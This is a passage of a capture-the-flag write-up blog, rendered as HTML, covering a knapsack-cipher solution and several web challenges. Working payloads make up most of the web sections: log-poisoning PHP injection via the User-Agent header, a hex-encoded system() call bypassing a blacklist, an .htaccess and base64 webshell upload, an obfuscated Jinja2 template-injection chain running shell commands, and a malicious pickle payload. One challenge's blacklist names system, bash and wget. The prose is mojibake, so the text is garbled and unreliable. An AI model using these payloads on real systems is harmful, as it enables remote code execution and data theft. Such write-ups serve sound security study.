class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">message = bytes_to_long(flag[<span class="number">8</span>:-<span class="number">1</span>])</span><br><span class="line">Baglenth=<span class="number">286</span></span><br><span class="line">Bag=[]</span><br><span class="line">Bag=Bag[::-<span class="number">1</span>]</span><br><span class="line">m=<span class="number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span></span><br><span class="line">w=<span class="number">274062421102700155372289583695782343443</span></span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(m,w)==<span class="number">1</span></span><br><span class="line">h=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> m.bit_length()%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m,lenth</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(m)&lt;lenth:</span><br><span class="line">        m=<span class="string">&#x27;0&#x27;</span>+m</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    pk=[]</span><br><span class="line">    sk=[]</span><br><span class="line">    sk.append(m)</span><br><span class="line">    sk.append(<span class="built_in">int</span>(gmpy2.invert(w,m)))</span><br><span class="line">    D=[]</span><br><span class="line">    binD=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        di=(w*Bag[i])%m</span><br><span class="line">        D.append(di)</span><br><span class="line">        bindi=<span class="built_in">bin</span>(di)[<span class="number">2</span>:]</span><br><span class="line">        bindi=pad(bindi,h)</span><br><span class="line">        binD.append(bindi)</span><br><span class="line">    U=[]</span><br><span class="line">    V=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        tempu=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        U.append(tempu)</span><br><span class="line">        tempv=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        V.append(tempv)</span><br><span class="line">    e=gmpy2.next_prime(<span class="built_in">sum</span>(V))+<span class="number">2</span></span><br><span class="line">    f=gmpy2.next_prime(<span class="built_in">sum</span>(U))</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    sk.append(<span class="built_in">int</span>(e))</span><br><span class="line">    sk.append(<span class="built_in">int</span>(f))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        ai=e*U[i]+f*V[i]</span><br><span class="line">        pk.append(<span class="built_in">int</span>(ai))</span><br><span class="line">    <span class="keyword">return</span> pk,sk</span><br><span class="line">Pk,Sk=keygen()</span><br><span class="line"><span class="built_in">print</span>(Pk)</span><br><span class="line"><span class="built_in">print</span>(Sk)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plain,pk</span>):</span><br><span class="line">    mbin=<span class="built_in">bin</span>(plain)[<span class="number">2</span>:]</span><br><span class="line">    c=<span class="number">0</span></span><br><span class="line">    mbin=pad(mbin,Baglenth)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        c=c+<span class="built_in">int</span>(mbin[i])*pk[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">c=Encrypt(message,Pk)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure></blockquote><p>èƒŒåŒ…å¯†ç ç³»ç»Ÿï¼ŒLLLç®—æ³•è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">pubKey = []</span><br><span class="line">nbit = <span class="built_in">len</span>(pubKey)</span><br><span class="line">encoded = </span><br><span class="line">A = Matrix(ZZ, nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, nbit] = pubKey[i]</span><br><span class="line">A[nbit, nbit] = -<span class="built_in">int</span>(encoded)</span><br><span class="line"></span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>):</span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i, M)</span><br><span class="line">        M = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> M)</span><br><span class="line">        M = M[:-<span class="number">1</span>]</span><br><span class="line">        M = <span class="built_in">hex</span>(<span class="built_in">int</span>(M, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(M))</span><br><span class="line">        </span><br><span class="line"><span class="string">b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ–‡ä»¶åŒ…å«ï¼Œç»• <code>require_once</code>ï¼Œburpsuiteæˆ– <code>curl -A</code> ä¿®æ”¹User-Agentä¸º <code>&lt;?php show_source(&quot;flag.php&quot;);?&gt;</code>ï¼Œ</p><p>ç„¶åç”¨æ—¥å¿—åŒ…å« <code>?file=/var/log/nginx/access.log</code> å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><blockquote><p>Post something</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>å¼‚å¸¸å¤„ç†å‡½æ•° <code>use()</code> ä¸­è¾“å‡ºflagï¼Œä¼ å‚æ—¶ä¼ å…¥æ•°ç»„å³å¯è§¦å‘å¼‚å¸¸ï¼š<code>ctf[]=1</code>ã€‚</p><p>â€‹    </p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>é»‘åå•ç»•è¿‡rceï¼Œç”¨16è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼š<code>aaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;);</code></p><p>â€‹    </p><h3 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h3><p>æ–‡ä»¶ä¸Šä¼ åç¼€ç™½åå•ç»•è¿‡ï¼Œåˆ©ç”¨.htaccessæ–‡ä»¶å®ç°éPHPæ–‡ä»¶è§£ææˆPHPä»£ç æ‰§è¡Œã€‚</p><p>å…ˆä¸Šä¼  <code>.htaccess</code> æ–‡ä»¶ï¼Œç”±äºæ–‡ä»¶ä¸­ä¸èƒ½åŒ…å« <code>&lt;?</code> ï¼Œç”¨PHPä¼ªåè®®base64è§£ç å¤„ç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot;</span><br></pre></td></tr></table></figure><p>å†ä¸Šä¼ base64ç¼–ç åçš„ <code>shell.xxx</code> æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>shell.xxx</code>ï¼Œå…¶ä¸­å†…å®¹ <code>&lt;?php print_r(file_get_contents(&#39;/flag&#39;));</code> ä»¥PHPä»£ç æ‰§è¡Œï¼Œå¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h3><p>ç™»å½•æ¡†éšä¾¿è¾“å…¥è´¦å·å¯†ç ï¼Œè¿›å…¥ <code>Hello xxx</code> ç•Œé¢ï¼Œå°è¯•æ›´æ¢è´¦å·ä¸º <code>&#123;&#123;2*3&#125;&#125;</code>ï¼Œå‡ºç° <code>Hello 6</code>ï¼Œå¯åˆ©ç”¨SSTIæ³¨å…¥rceã€‚</p><p>Fuzzå‘ç°è¿‡æ»¤äº†å¾ˆå¤šç¬¦å·ï¼ŒåŒ…æ‹¬ <code>request _ &#39; &quot; [ . ç©ºæ ¼ class getitem import</code> ç­‰ï¼Œä¸è¿‡ <code>config</code> å¯ç”¨ï¼Œå¯ä» <code>&#123;&#123;config&#125;&#125;</code> å†…å®¹å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ‰€éœ€å­—ç¬¦æ¥æ‹¼æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œå¯ä»¥é¿å…ç”¨åˆ°å¼•å·ï¼›è¿‡æ»¤çš„å…³é”®è¯ä½¿ç”¨ <code>dict(cla=aa,ss=bb)|join()</code> å½¢å¼ç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _</span></span><br><span class="line">config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># ç©ºæ ¼</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># /</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __class__</span></span><br><span class="line">(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># config.__class__.__init__.__globals__</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(geti=aa,tem=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)(<span class="built_in">dict</span>(o=aa,s=bb)|join())|attr(<span class="built_in">dict</span>(po=aa,pen=bb)|join())(<span class="built_in">dict</span>(c=aa,at=bb)|join()+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)+<span class="built_in">dict</span>(fl=aa,ag=bb)|join())|attr(<span class="built_in">dict</span>(re=aa,ad=bb)|join())()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># è¿™é‡Œæˆ‘ä¹Ÿæ”¹äº†ä¸€ä¸‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>flaskæ¡†æ¶ï¼Œç”¨åˆ°pythonååºåˆ—åŒ–ï¼Œå‚è€ƒ<a href="https://www.ieven762.cn/index.php/archives/109/">å·…å³°æå®¢2021 - what_pickle</a>ï¼Œé™åˆ¶äº†åŠ è½½çš„æ¨¡å—åªèƒ½ä¸º <code>config</code> é‡Œçš„ï¼Œåå­—ä¸èƒ½æœ‰ <code>__</code>ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ <code>config</code> çš„ <code>backdoor(cmd)</code> å‡½æ•°ç»•è¿‡ã€‚</p><p>è¿™é¢˜ç®€åŒ–äº† <code>backdoor(cmd)</code> å‡½æ•°çš„ä½¿ç”¨æ¡ä»¶ï¼Œç›´æ¥è°ƒç”¨å³å¯ã€‚åˆ©ç”¨pkeræ„é€ opcodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>base64ç¼–ç opcodeï¼Œä¼ å‚ï¼š</p><p><code>data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u</code></p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="simpleXOR"><a href="#simpleXOR" class="headerlink" 